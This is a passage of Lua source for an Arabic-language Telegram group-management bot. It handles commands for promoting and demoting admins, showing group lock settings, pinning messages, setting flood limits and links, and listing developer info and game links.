send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end


if text == ("رفع منشئ بالكروب") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية اضافة مشرفين يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n ​✯︙الايدي » '..result.sender_user_id_..'\n✯︙تم رفعه منشئ بالكروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ بالكروب @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^رفع منشئ بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية اضافة مشرفين يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ✯︙عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WviivW')..')'
status  = '\n✯︙تم رفعه منشئ بالكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text == ("تنزيل منشئ بالكروب") and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية ازالة مشرفين يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n✯︙الايدي » '..result.sender_user_id_..'\n✯︙تم تنزيله ادمن من الكروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ بالكروب @(.*)$") and ChanSub(msg) and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ بالكروب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'✯︙لا امتلك صلاحية ازالة مشرفين يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠¦ عذرا عزيزي المستخدم هذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n✯︙العضو » ['..result.title_..'](t.me/'..(username or 'WviivW')..')'
status  = '\n✯︙تم تنزيله من المنشئ بالكروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '✯︙لا يوجد حساب بهذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'الاعدادات' and ChanSub(msg) and Mod(msg) or text == 'اعدادات الكروب' and ChanSub(msg) and Mod(msg) then    
if database:get(bot_id..'lockpin'..msg.chat_id_) then    
lock_pin = '❌'
else 
lock_pin = '✅'    
end
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then    
lock_tagservr = '❌'
else 
lock_tagservr = '✅'    
end
if database:get(bot_id..'lock:text'..msg.chat_id_) then    
lock_text = '❌'
else 
lock_text = '✅'    
end
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
lock_add = '❌'
else 
lock_add = '✅'    
end    
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
lock_join = '❌'
else 
lock_join = '✅'    
end    
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit = '❌'
else 
lock_edit = '✅'    
end
print(welcome)
if database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_) then
welcome = '❌'
else 
welcome = '✅'    
end
if database:get(bot_id..'lock:edit'..msg.chat_id_) then    
lock_edit_med = '❌'
else 
lock_edit_med = '✅'    
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = 'بالطرد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = 'بالتقيد'     
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = 'بالكتم'           
elseif database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = 'بالمسح'           
else     
flood = '✅'     
end
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
lock_photo = '❌' 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = 'بالتقيد'   
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = 'بالكتم'    
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = 'بالطرد'   
else
lock_photo = '✅'   
end    
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
lock_phon = '❌' 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = 'بالتقيد'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = 'بالكتم'    
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = 'بالطرد'    
else
lock_phon = '✅'    
end    
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" then
lock_links = '❌'
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" then
lock_links = 'بالتقيد'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" then
lock_links = 'بالكتم'    
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" then
lock_links = 'بالطرد'    
else
lock_links = '✅'    
end
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = '❌'
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = 'بالتقيد'    
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = 'بالكتم'   
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = 'بالطرد'    
else
lock_cmds = '✅'    
end
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" then
lock_user = '❌'
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" then
lock_user = 'بالتقيد'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" then
lock_user = 'بالكتم'    
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" then
lock_user = 'بالطرد'    
else
lock_user = '✅'    
end
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = '❌'
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = 'بالتقيد'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = 'بالكتم'    
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = 'بالطرد'    
else
lock_hash = '✅'    
end
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_muse = '❌'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = 'بالطرد'    
else
lock_muse = '✅'    
end 
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
lock_ved = '❌'
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = 'بالتقيد'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = 'بالكتم'    
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = 'بالطرد'    
else
lock_ved = '✅'    
end
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
lock_gif = '❌'
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = 'بالتقيد'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = 'بالكتم'    
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = 'بالطرد'    
else
lock_gif = '✅'    
end
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = '❌'
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = 'بالتقيد'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = 'بالكتم'    
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = 'بالطرد'    
else
lock_ste = '✅'    
end
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
lock_geam = '❌'
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = 'بالتقيد'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = 'بالكتم'    
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = 'بالطرد'    
else
lock_geam = '✅'    
end    
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
lock_vico = '❌'
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = 'بالتقيد'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم'    
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد'    
else
lock_vico = '✅'    
end    
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = '❌'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد'
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم'    
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد'
else
lock_inlin = '✅'
end
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = '❌'
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم'    
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد'    
else
lock_fwd = '✅'    
end    
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = '❌'
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم'    
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد'    
else
lock_file = '✅'    
end    
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = '❌'
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم'    
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد'    
else
lock_self = '✅'    
end
if database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = '❌'
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد'   
elseif database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد'    
else
lock_bots = '✅'    
end
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = '❌'
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم'    
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد'    
else
lock_mark = '✅'    
end
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = '❌'
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم'    
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد'    
else
lock_spam = '✅'    
end        
if not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
rdmder = '✅'
else
rdmder = '❌'
end
if not database:get(bot_id..'Reply:Sudo'..msg.chat_id_) then
rdsudo = '✅'
else
rdsudo = '❌'
end
if not database:get(bot_id..'Bot:Id'..msg.chat_id_)  then
idgp = '✅'
else
idgp = '❌'
end
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then
idph = '✅'
else
idph = '❌'
end
if not database:get(bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = '✅'
else
setadd = '❌'
end
if not database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = '✅'
else
banm = '❌'
end
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
addme = '✅'
else
addme = '❌'
end
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
sehuser = '✅'
else
sehuser = '❌'
end
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
kickme = '✅'
else
kickme = '❌'
end
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'\n⚙️┇𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ '..
'\n✯︙اعدادات الكروب كتالي √↓'..
'\nءٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n✯︙علامة ال {✅} تعني مفتوح'..
'\n✯︙علامة ال {❌} تعني مقفل'..
'\nءٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n✯︙الروابط » { '..lock_links..
' }\n'..'✯︙المعرفات » { '..lock_user..
' }\n'..'✯︙التاك » { '..lock_hash..
' }\n'..'✯︙البوتات » { '..lock_bots..
' }\n'..'✯︙التوجيه » { '..lock_fwd..
' }\n'..'✯︙التثبيت » { '..lock_pin..
' }\n'..'✯︙الاشعارات » { '..lock_tagservr..
' }\n'..'✯︙الماركدون » { '..lock_mark..
' }\n'..'✯︙التعديل » { '..lock_edit..
' }\n'..'✯︙تعديل الميديا » { '..lock_edit_med..
' }\nءٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n'..'✯︙الكلايش » { '..lock_spam..
' }\n'..'✯︙الكيبورد » { '..lock_inlin..
' }\n'..'✯︙الاغاني » { '..lock_vico..
' }\n'..'✯︙المتحركه » { '..lock_gif..
' }\n'..'✯︙الملفات » { '..lock_file..
' }\n'..'✯︙الدردشه » { '..lock_text..
' }\n'..'✯︙الفيديو » { '..lock_ved..
' }\n'..'✯︙الصور » { '..lock_photo..
' }\nءٴ≪━━━━ ??𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n'..'✯︙الصوت » { '..lock_muse..
' }\n'..'✯︙الملصقات » { '..lock_ste..
' }\n'..'✯︙الجهات » { '..lock_phon..
' }\n'..'✯︙الدخول » { '..lock_join..
' }\n'..'✯︙الاضافه » { '..lock_add..
' }\n'..'✯︙السيلفي » { '..lock_self..
' }\n'..'✯︙الالعاب » { '..lock_geam..
' }\n'..'✯︙التكرار » { '..flood..
' }\n'..'✯︙الترحيب » { '..welcome..
' }\n'..'✯︙عدد التكرار » { '..NUM_MSG_MAX..
' }\nءٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n✯︙علامة ال {✅} تعني مفعل'..
'\n✯︙علامة ال {❌} تعني معطل'..
'\nءٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ'..
'\n'..'✯︙امر صيح » { '..sehuser..
' }\n'..'✯︙امر اطردني » { '..kickme..
' }\n'..'✯︙امر منو ضافني » { '..addme..
' }\n'..'✯︙ردود المدير » { '..rdmder..
' }\n'..'✯︙ردود المطور » { '..rdsudo..
' }\n'..'✯︙الايدي » { '..idgp..
' }\n'..'✯︙الايدي بالصوره » { '..idph..
' }\n'..'✯︙الرفع » { '..setadd..
' }\n'..'✯︙الحظر » { '..banm..' }\n\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙قناة سورس وطن ↓\n [🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚆𝙰𝚃𝙰𝙽.](t.me/WaTaNTeaM) \n'
send(msg.chat_id_, msg.id_,text)     
end
if text ==('تثبيت') and ChanSub(msg) and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ✯︙عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ✯︙تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ✯︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ✯︙لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ✯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and ChanSub(msg) and Mod(msg) then  
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ✯︙عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," ✯︙تم الغاء تثبيت الرساله")   
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ✯︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ✯︙لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ✯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text == 'الغاء تثبيت الكل' and ChanSub(msg) and Mod(msg) then  
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_," ✯︙عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"✯︙تم الغاء تثبيت الكل")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_," ✯︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_," ✯︙لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," ✯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end
if text and text:match('^ضع تكرار (%d+)$') and ChanSub(msg) and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,'✯︙تم وضع عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and ChanSub(msg) and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,'✯︙تم وضع زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" and ChanSub(msg) or text == 'وضع رابط' and ChanSub(msg) then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
send(msg.chat_id_,msg.id_," ✯︙حسنآ ارسل اليه الرابط الان")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل رابط" and ChanSub(msg) or text == 'تفعيل الرابط' and ChanSub(msg) then
if Mod(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 🟢︙ تم تفعيل الرابط") 
return false  
end
end
if text == "تعطيل الرابط" and ChanSub(msg) or text == "تعطيل رابط" and ChanSub(msg) then
if Mod(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 🔴︙ تم تعطيل الرابط") 
return false end
end
if text == "تفعيل رابط الانلاين" and ChanSub(msg) then
if Mod(msg) then  
database:set(bot_id.."InlineLink_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 🟢︙ تم تفعيل رابط الانلاين") 
return false  
end
end
if text == "تعطيل رابط الانلاين" and ChanSub(msg) then
if Mod(msg) then  
database:del(bot_id.."InlineLink_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 🔴︙ تم تعطيل رابط الانلاين") 
return false end
end
if text == 'المطور' and ChanSub(msg) or text == 'مطور' and ChanSub(msg) or text == 'مطور البوت' and ChanSub(msg) then
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = SUDO,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
local msg_id = msg.id_/2097152/0.5
if not database:get(bot_id..'TEXT_SUDO') then
Text = "*𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙾𝙵 𝙱𝙾𝚃 ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝙾𝙵 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ↬* [@"..result.username_.."]"
else
Text = database:get(bot_id..'TEXT_SUDO')
end
if abbas.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or WaTaNTeaM}},
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/WaTaNTeaM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..abbas.photos_[0].sizes_[1].photo_.persistent_id_..'&caption='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,Text) 
end
end,nil)
end,nil)
end

if text == "مبرمج السورس" and ChanSub(msg) or text == "المبرمج" and ChanSub(msg) or text == "مطور السورس" and ChanSub(msg) or text == "وين المبرمج" and ChanSub(msg) then
Text = [[
  ✯︙[DeVeLoPErE OF SoURcE](https://t.me/abbasfadhil)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙DeVeLoPErE OF SoURcE',url="t.me/abbasfadhil"}},
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/WaTaNTeaM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/WaTaNTeaM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end

if text == 'القناة' and ChanSub(msg) or text == 'قناة السورس' and ChanSub(msg) or text == 'قناه السورس' and ChanSub(msg) or text == 'قنات السورس' and ChanSub(msg) then 
Text = [[
[✯︙ChAnNeL OF SoURcE](https://t.me/WaTaNTeaM)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯︙ChAnNeL OF SoURcE',url="t.me/WaTaNTeaM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/WaTaNTeaM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "تفعيل الالعاب المتطوره" and ChanSub(msg) and Manager(msg) then
if database:get(bot_id..'Abs:Lock:Gamesinline'..msg.chat_id_) then
Text = '\n✯︙تم تفعيل امر الالعاب المتطوره'
database:del(bot_id..'Abs:Lock:Gamesinline'..msg.chat_id_)  
else
Text = '\n✯︙بالتاكيد تم تفعيل امر الالعاب المتطوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تعطيل الالعاب المتطوره" and ChanSub(msg) and Manager(msg) then
if not database:get(bot_id..'Abs:Lock:Gamesinline'..msg.chat_id_) then
database:set(bot_id..'Abs:Lock:Gamesinline'..msg.chat_id_,true)  
Text = '\n✯︙تم تعطيل امر الالعاب المتطوره'
else
Text = '\n✯︙بالتاكيد تم تعطيل امر الالعاب المتطوره'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == "الالعاب المتطوره" and ChanSub(msg) or text == "الالعاب الاحترافيه" and ChanSub(msg) then
if not database:get(bot_id..'Abs:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*᥀︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="♟ الشطرنج ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحدي الرياضيات",url='https://t.me/gamebot?game=MathBattle'}},
{{text="اكس او",url='t.me/xobot?start'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
